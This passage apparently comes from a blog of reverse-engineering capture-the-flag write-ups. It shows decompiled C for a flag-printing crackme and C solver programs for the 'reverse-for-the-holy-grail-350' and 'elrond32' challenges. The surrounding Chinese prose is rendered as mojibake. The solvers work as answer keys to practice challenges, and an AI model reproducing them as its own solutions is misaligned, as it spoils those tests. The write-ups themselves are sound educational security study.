eax</span></span><br><span class="line">  <span class="keyword">int</span> *v71; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v72; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v73; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v74; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v75; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v76; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v77; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v78; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v79; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v80; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v81; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v82; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v83; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v84; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v85; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v86; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v87; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v88; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v89; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v90; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v91; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v92; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v93; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v94; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v95; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v96; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v97; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v98; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v99; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v100; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v101; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v102; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v103; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v104; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v105; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v106; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v107; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v108; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v109; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> *v110; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v111; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v112; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v113; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v114; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v115; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v116; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v120[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v121; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    v120[i] = <span class="number">1</span>;</span><br><span class="line">  v121 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your flag is:"</span>);</span><br><span class="line">  v3 = sub_401100(v120, <span class="number">1000000000</span>);</span><br><span class="line">  v4 = sub_401220(v3, <span class="number">999999950</span>);</span><br><span class="line">  sub_401100(v4, <span class="number">2</span>);</span><br><span class="line">  v5 = sub_401000(&amp;v120[<span class="number">1</span>], <span class="number">5000000</span>);</span><br><span class="line">  v6 = sub_401220(v5, <span class="number">6666666</span>);</span><br><span class="line">  v7 = sub_401000(v6, <span class="number">1666666</span>);</span><br><span class="line">  v8 = sub_401000(v7, <span class="number">45</span>);</span><br><span class="line">  v9 = sub_401100(v8, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v9, <span class="number">5</span>);</span><br><span class="line">  v10 = sub_401100(&amp;v120[<span class="number">2</span>], <span class="number">1000000000</span>);</span><br><span class="line">  v11 = sub_401220(v10, <span class="number">999999950</span>);</span><br><span class="line">  v12 = sub_401100(v11, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v12, <span class="number">2</span>);</span><br><span class="line">  v13 = sub_401000(&amp;v120[<span class="number">3</span>], <span class="number">55</span>);</span><br><span class="line">  v14 = sub_401220(v13, <span class="number">3</span>);</span><br><span class="line">  v15 = sub_401000(v14, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v15, <span class="number">1</span>);</span><br><span class="line">  v16 = sub_401100(&amp;v120[<span class="number">4</span>], <span class="number">100000000</span>);</span><br><span class="line">  v17 = sub_401220(v16, <span class="number">99999950</span>);</span><br><span class="line">  v18 = sub_401100(v17, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v18, <span class="number">2</span>);</span><br><span class="line">  v19 = sub_401220(&amp;v120[<span class="number">5</span>], <span class="number">1</span>);</span><br><span class="line">  v20 = sub_401100(v19, <span class="number">1000000000</span>);</span><br><span class="line">  v21 = sub_401000(v20, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v21, <span class="number">3</span>);</span><br><span class="line">  v22 = sub_401100(&amp;v120[<span class="number">6</span>], <span class="number">1000000</span>);</span><br><span class="line">  v23 = sub_401220(v22, <span class="number">999975</span>);</span><br><span class="line">  sub_401100(v23, <span class="number">4</span>);</span><br><span class="line">  v24 = sub_401000(&amp;v120[<span class="number">7</span>], <span class="number">55</span>);</span><br><span class="line">  v25 = sub_401220(v24, <span class="number">33</span>);</span><br><span class="line">  v26 = sub_401000(v25, <span class="number">44</span>);</span><br><span class="line">  sub_401220(v26, <span class="number">11</span>);</span><br><span class="line">  v27 = sub_401100(&amp;v120[<span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">  v28 = sub_401220(v27, <span class="number">5</span>);</span><br><span class="line">  v29 = sub_401100(v28, <span class="number">8</span>);</span><br><span class="line">  sub_401000(v29, <span class="number">9</span>);</span><br><span class="line">  v30 = sub_401000(&amp;v120[<span class="number">9</span>], <span class="number">0</span>);</span><br><span class="line">  v31 = sub_401220(v30, <span class="number">0</span>);</span><br><span class="line">  v32 = sub_401000(v31, <span class="number">11</span>);</span><br><span class="line">  v33 = sub_401220(v32, <span class="number">11</span>);</span><br><span class="line">  sub_401000(v33, <span class="number">53</span>);</span><br><span class="line">  v34 = sub_401000(&amp;v120[<span class="number">10</span>], <span class="number">49</span>);</span><br><span class="line">  v35 = sub_401220(v34, <span class="number">2</span>);</span><br><span class="line">  v36 = sub_401000(v35, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v36, <span class="number">2</span>);</span><br><span class="line">  v37 = sub_401100(&amp;v120[<span class="number">11</span>], <span class="number">1000000</span>);</span><br><span class="line">  v38 = sub_401220(v37, <span class="number">999999</span>);</span><br><span class="line">  v39 = sub_401100(v38, <span class="number">4</span>);</span><br><span class="line">  sub_401000(v39, <span class="number">50</span>);</span><br><span class="line">  v40 = sub_401000(&amp;v120[<span class="number">12</span>], <span class="number">1</span>);</span><br><span class="line">  v41 = sub_401000(v40, <span class="number">1</span>);</span><br><span class="line">  v42 = sub_401000(v41, <span class="number">1</span>);</span><br><span class="line">  v43 = sub_401000(v42, <span class="number">1</span>);</span><br><span class="line">  v44 = sub_401000(v43, <span class="number">1</span>);</span><br><span class="line">  v45 = sub_401000(v44, <span class="number">1</span>);</span><br><span class="line">  v46 = sub_401000(v45, <span class="number">10</span>);</span><br><span class="line">  sub_401000(v46, <span class="number">32</span>);</span><br><span class="line">  v47 = sub_401100(&amp;v120[<span class="number">13</span>], <span class="number">10</span>);</span><br><span class="line">  v48 = sub_401220(v47, <span class="number">5</span>);</span><br><span class="line">  v49 = sub_401100(v48, <span class="number">8</span>);</span><br><span class="line">  v50 = sub_401000(v49, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v50, <span class="number">48</span>);</span><br><span class="line">  v51 = sub_401220(&amp;v120[<span class="number">14</span>], <span class="number">1</span>);</span><br><span class="line">  v52 = sub_401100(v51, <span class="number">-294967296</span>);</span><br><span class="line">  v53 = sub_401000(v52, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v53, <span class="number">3</span>);</span><br><span class="line">  v54 = sub_401000(&amp;v120[<span class="number">15</span>], <span class="number">1</span>);</span><br><span class="line">  v55 = sub_401000(v54, <span class="number">2</span>);</span><br><span class="line">  v56 = sub_401000(v55, <span class="number">3</span>);</span><br><span class="line">  v57 = sub_401000(v56, <span class="number">4</span>);</span><br><span class="line">  v58 = sub_401000(v57, <span class="number">5</span>);</span><br><span class="line">  v59 = sub_401000(v58, <span class="number">6</span>);</span><br><span class="line">  v60 = sub_401000(v59, <span class="number">7</span>);</span><br><span class="line">  sub_401000(v60, <span class="number">20</span>);</span><br><span class="line">  v61 = sub_401100(&amp;v120[<span class="number">16</span>], <span class="number">10</span>);</span><br><span class="line">  v62 = sub_401220(v61, <span class="number">5</span>);</span><br><span class="line">  v63 = sub_401100(v62, <span class="number">8</span>);</span><br><span class="line">  v64 = sub_401000(v63, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v64, <span class="number">48</span>);</span><br><span class="line">  v65 = sub_401000(&amp;v120[<span class="number">17</span>], <span class="number">7</span>);</span><br><span class="line">  v66 = sub_401000(v65, <span class="number">6</span>);</span><br><span class="line">  v67 = sub_401000(v66, <span class="number">5</span>);</span><br><span class="line">  v68 = sub_401000(v67, <span class="number">4</span>);</span><br><span class="line">  v69 = sub_401000(v68, <span class="number">3</span>);</span><br><span class="line">  v70 = sub_401000(v69, <span class="number">2</span>);</span><br><span class="line">  v71 = sub_401000(v70, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v71, <span class="number">20</span>);</span><br><span class="line">  v72 = sub_401000(&amp;v120[<span class="number">18</span>], <span class="number">7</span>);</span><br><span class="line">  v73 = sub_401000(v72, <span class="number">2</span>);</span><br><span class="line">  v74 = sub_401000(v73, <span class="number">4</span>);</span><br><span class="line">  v75 = sub_401000(v74, <span class="number">3</span>);</span><br><span class="line">  v76 = sub_401000(v75, <span class="number">6</span>);</span><br><span class="line">  v77 = sub_401000(v76, <span class="number">5</span>);</span><br><span class="line">  v78 = sub_401000(v77, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v78, <span class="number">20</span>);</span><br><span class="line">  v79 = sub_401100(&amp;v120[<span class="number">19</span>], <span class="number">1000000</span>);</span><br><span class="line">  v80 = sub_401220(v79, <span class="number">999999</span>);</span><br><span class="line">  v81 = sub_401100(v80, <span class="number">4</span>);</span><br><span class="line">  v82 = sub_401000(v81, <span class="number">50</span>);</span><br><span class="line">  sub_401220(v82, <span class="number">1</span>);</span><br><span class="line">  v83 = sub_401220(&amp;v120[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">  v84 = sub_401100(v83, <span class="number">-294967296</span>);</span><br><span class="line">  v85 = sub_401000(v84, <span class="number">49</span>);</span><br><span class="line">  sub_401220(v85, <span class="number">1</span>);</span><br><span class="line">  v86 = sub_401220(&amp;v120[<span class="number">21</span>], <span class="number">1</span>);</span><br><span class="line">  v87 = sub_401100(v86, <span class="number">1000000000</span>);</span><br><span class="line">  v88 = sub_401000(v87, <span class="number">54</span>);</span><br><span class="line">  v89 = sub_401220(v88, <span class="number">1</span>);</span><br><span class="line">  v90 = sub_401000(v89, <span class="number">1000000000</span>);</span><br><span class="line">  sub_401220(v90, <span class="number">1000000000</span>);</span><br><span class="line">  v91 = sub_401000(&amp;v120[<span class="number">22</span>], <span class="number">49</span>);</span><br><span class="line">  v92 = sub_401220(v91, <span class="number">1</span>);</span><br><span class="line">  v93 = sub_401000(v92, <span class="number">2</span>);</span><br><span class="line">  sub_401220(v93, <span class="number">1</span>);</span><br><span class="line">  v94 = sub_401100(&amp;v120[<span class="number">23</span>], <span class="number">10</span>);</span><br><span class="line">  v95 = sub_401220(v94, <span class="number">5</span>);</span><br><span class="line">  v96 = sub_401100(v95, <span class="number">8</span>);</span><br><span class="line">  v97 = sub_401000(v96, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v97, <span class="number">48</span>);</span><br><span class="line">  v98 = sub_401000(&amp;v120[<span class="number">24</span>], <span class="number">1</span>);</span><br><span class="line">  v99 = sub_401000(v98, <span class="number">3</span>);</span><br><span class="line">  v100 = sub_401000(v99, <span class="number">3</span>);</span><br><span class="line">  v101 = sub_401000(v100, <span class="number">3</span>);</span><br><span class="line">  v102 = sub_401000(v101, <span class="number">6</span>);</span><br><span class="line">  v103 = sub_401000(v102, <span class="number">6</span>);</span><br><span class="line">  v104 = sub_401000(v103, <span class="number">6</span>);</span><br><span class="line">  sub_401000(v104, <span class="number">20</span>);</span><br><span class="line">  v105 = sub_401000(&amp;v120[<span class="number">25</span>], <span class="number">55</span>);</span><br><span class="line">  v106 = sub_401220(v105, <span class="number">33</span>);</span><br><span class="line">  v107 = sub_401000(v106, <span class="number">44</span>);</span><br><span class="line">  v108 = sub_401220(v107, <span class="number">11</span>);</span><br><span class="line">  sub_401000(v108, <span class="number">42</span>);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">26</span>], v120[<span class="number">25</span>]);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">27</span>], v120[<span class="number">12</span>]);</span><br><span class="line">  v109 = v120[<span class="number">27</span>];</span><br><span class="line">  v110 = sub_401220(&amp;v120[<span class="number">28</span>], <span class="number">1</span>);</span><br><span class="line">  v111 = sub_401000(v110, v109);</span><br><span class="line">  sub_401220(v111, <span class="number">1</span>);</span><br><span class="line">  v112 = v120[<span class="number">23</span>];</span><br><span class="line">  v113 = sub_401220(&amp;v120[<span class="number">29</span>], <span class="number">1</span>);</span><br><span class="line">  v114 = sub_401100(v113, <span class="number">1000000</span>);</span><br><span class="line">  sub_401000(v114, v112);</span><br><span class="line">  v115 = v120[<span class="number">27</span>];</span><br><span class="line">  v116 = sub_401000(&amp;v120[<span class="number">30</span>], <span class="number">1</span>);</span><br><span class="line">  sub_401100(v116, v115);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">31</span>], v120[<span class="number">30</span>]);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CTF&#123;"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>, (v120[j]));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h2><p>åˆæ˜¯C++çš„é¢˜, å¯¹äºåˆå­¦, æˆ‘çœ‹è¿™ä¸ªæœ‰äº›è¿˜æ˜¯å¾ˆåƒåŠ›çš„, æœ‰äº›å‡½æ•°åŠŸèƒ½è¿è’™å¸¦çŒœ. å…¶å®é™ä¸‹å¿ƒæ¥åˆ†æ, é€»è¾‘è¿˜æ˜¯å¾ˆç®€å•.</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200421172942651-1590549186380-1591952692434.png" alt="image-20200421172942651-1590549186380"></p><p>æ‰¾åˆ°å…³é”®å‡½æ•°è¿›å»å, çœ‹èµ·æ¥å¾ˆå¤š, ä½†é€»è¾‘ä¹Ÿæ˜¯ä¸éš¾çš„. </p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200421173112461-1590549193146-1591952706873.png" alt="image-20200421173112461-1590549193146"></p><p>è¿™æ˜¯ç¨‹åºçš„ç®—æ³•, æˆ‘æŒ¨ä¸ªè®°å½•äº†ä¸‹æ¥â€¦â€¦..æˆ‘åœ¨åˆ°è¿™æ­¥çš„æ—¶å€™, å°±æ˜¯åœ¨çº ç»“é‚£ä¸ªå–ä½™å¤šè§£çš„é—®é¢˜, æƒ³åˆ°ç®—èµ·æ¥å¾ˆçƒ¦, ä½†ç”±äºæ˜¯å¯è¾“å…¥çš„å­—ç¬¦, æˆ‘ä»¬ç”¨éå†å³å¯ (0-127)</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200421173211318-1590549201703-1591952713057.png" alt="image-20200421173211318-1590549201703"></p><p>æœ€åé™„ä¸Š,  ä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first[] = &#123;<span class="number">0x41</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x45</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> second[] = &#123;<span class="number">0x2ef</span>, <span class="number">0x2c4</span>, <span class="number">0x2dc</span>, <span class="number">0x2c7</span>, <span class="number">0x2de</span>, <span class="number">0x2fc</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> third[] = &#123;<span class="number">0x1d7</span>, <span class="number">0xc</span>, <span class="number">0x244</span>, <span class="number">0x25e</span>, <span class="number">0x93</span>, <span class="number">0x6c</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> mod[<span class="number">18</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">666</span>, j = <span class="number">0</span>, z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mod[i] = n;</span><br><span class="line">n += n%<span class="number">5</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i += <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = first[j];</span><br><span class="line"></span><br><span class="line">flag[i+<span class="number">2</span>] = second[j] ^ mod[i+<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(z = <span class="number">0</span>; z &lt; <span class="number">127</span>; z++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((flag[i] ^ mod[i])*(z^mod[i+<span class="number">1</span>]) % second[j] == third[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i+<span class="number">1</span>] = z;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">j++;</span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“: ç¨‹åºä¸­æ³¨æ„çœ‹æ¸…ä¼ å…¥å‚æ•°æ—¶,æ˜¯ä¸€ä¸ªå­—èŠ‚, è¿˜æ˜¯ä¸€ä¸ªintç±»å‹(4ä¸ªå­—èŠ‚); å–ä½™è¿ç®—, é€†å‘æ—¶, ä¸€èˆ¬éå†å³å¯.</p><hr><h2 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h2><p>é¦–å…ˆ, ä¸‹è½½ä¸‹æ¥, ç”¨idaæ‰“å¼€, å‘ç°æ²¡æœ‰è¾“å…¥çš„åœ°æ–¹. æˆ–è®¸æ˜¯éšè—èµ·æ¥äº†. å°±åœ¨linuxä¸­è¿è¡Œä¸€ä¸‹æ¥çœ‹, æœç„¶æ²¡æœ‰è¾“å…¥, åªæ˜¯è¾“å‡ºéªŒè¯å¤±è´¥.</p><p>å›åˆ°ida, é€»è¾‘ä¹Ÿå¾ˆæ¸…æ¥š, å°±æ˜¯ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ é0 å³å¯, è¿›å…¥å…³é”®å‡½æ•°: ä¹Ÿå¾ˆç®€å•, å°±æ˜¯ä¸€ä¸ªé€’å½’è°ƒç”¨. ä»0å¼€å§‹, æ¯æ¬¡ (a1) éƒ½ç¬¦åˆç›¸åº”çš„å€¼ä¸”æœ€è¦æœ€åçš„è·³å‡ºé€’å½’å³å¯.é€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±çŸ¥é“äº† a1æ•°ç»„çš„å€¼.  ç®—äº†ä¸€ä¸‹ a2çš„å€¼ä¸º: 0 7 1 3 6 5 9 4 2, è€Œ2æ²¡æœ‰å°±è·³å‡º. æŒ‰ç…§è¿™ä¸ªé¡ºåºå– (a1) .</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200421190646720-1590549218465-1591952718294.png" alt="image-20200421190646720-1590549218465"></p><p>å…¶å®æµè§ˆç¨‹åºçš„æ—¶å€™, å·²ç»çœ‹è¿‡ éªŒè¯é€šè¿‡ä¸‹é¢çš„ä¸€ä¸ªå‡½æ•°, å°±æ˜¯è®©33ä¸ªå·²ç»ç¼–ç äº†çš„å­—ç¬¦ä¸æˆ‘ä»¬å¾—åˆ°çš„ (a1)å¼‚æˆ–è¿ç®—, å†æ‰“å°å‡ºflag. ä¸‹é¢Cä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">105</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">100</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;<span class="keyword">char</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">33</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">45</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">65</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(A.n[i] ^ a[i % <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 